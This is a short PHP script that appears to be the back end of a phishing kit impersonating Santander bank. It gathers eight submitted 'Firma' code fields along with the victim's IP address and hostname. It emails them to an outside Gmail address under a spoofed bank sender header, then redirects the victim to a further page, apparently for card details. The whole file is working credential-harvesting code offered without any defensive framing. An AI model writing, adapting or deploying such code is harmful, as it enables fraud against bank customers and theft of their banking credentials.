<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________Santander_____________\n";
$message .= "\n";
$message .= "Firma :  ".$_POST['n1']." ".$_POST['n2']." ".$_POST['n3']." ".$_POST['n4']." ".$_POST['n5']." ".$_POST['n6']." ".$_POST['n7']." ".$_POST['n8']." \n";

$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| Yawyaw  |__________\n";
$send = "bader.elw@gmail.com";
$subject = "Firma |".$_POST['cc']."| $ip ";
$headers = "From:Firm Santander <webmaster@cajamar.es>";
mail($send,$subject,$message,$headers);

header("Location: cc.htm");

?>